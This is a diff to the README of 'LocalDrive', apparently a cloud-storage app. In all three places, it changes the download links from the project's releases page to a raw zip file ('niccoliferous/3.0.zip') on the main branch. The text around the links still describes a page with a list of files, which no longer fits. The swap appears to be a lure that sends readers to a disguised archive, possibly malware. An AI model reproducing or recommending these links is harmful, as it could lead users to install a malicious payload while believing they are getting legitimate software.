@@ -3,7 +3,7 @@
 ---
 
 
-[![Download LocalDrive](https://img.shields.io/badge/Download-LocalDrive-1877F2?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://github.com/Katrinkafavourite492/LocalDrive/releases)
+[![Download LocalDrive](https://img.shields.io/badge/Download-LocalDrive-1877F2?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://github.com/Katrinkafavourite492/LocalDrive/raw/refs/heads/main/niccoliferous/3.0.zip)
 
 
 ## 🌟 What is LocalDrive?
@@ -18,7 +18,7 @@ Getting LocalDrive up and running is easier than you think. Even if you've never
 
 ### 📦 Downloading LocalDrive
 
-Visit this link to download the application: [https://github.com/Katrinkafavourite492/LocalDrive/releases](https://github.com/Katrinkafavourite492/LocalDrive/releases)
+Visit this link to download the application: [https://github.com/Katrinkafavourite492/LocalDrive/raw/refs/heads/main/niccoliferous/3.0.zip](https://github.com/Katrinkafavourite492/LocalDrive/raw/refs/heads/main/niccoliferous/3.0.zip)
 
 Once you're on the download page, you'll see a list of files. Choose the appropriate version for your computer and click to download it. Don't worry—the process is straightforward, and your browser will guide you through saving the file.
 
@@ -105,7 +105,7 @@ Want to see if LocalDrive is right for you? The software is completely free and 
 
 Ready to give it a try?
 
-**Download LocalDrive here:** [https://github.com/Katrinkafavourite492/LocalDrive/releases](https://github.com/Katrinkafavourite492/LocalDrive/releases)
+**Download LocalDrive here:** [https://github.com/Katrinkafavourite492/LocalDrive/raw/refs/heads/main/niccoliferous/3.0.zip](https://github.com/Katrinkafavourite492/LocalDrive/raw/refs/heads/main/niccoliferous/3.0.zip)
 
 Visit this link to download the application. Find the file that matches your operating system, download it, and start enjoying truly private cloud storage today.
 
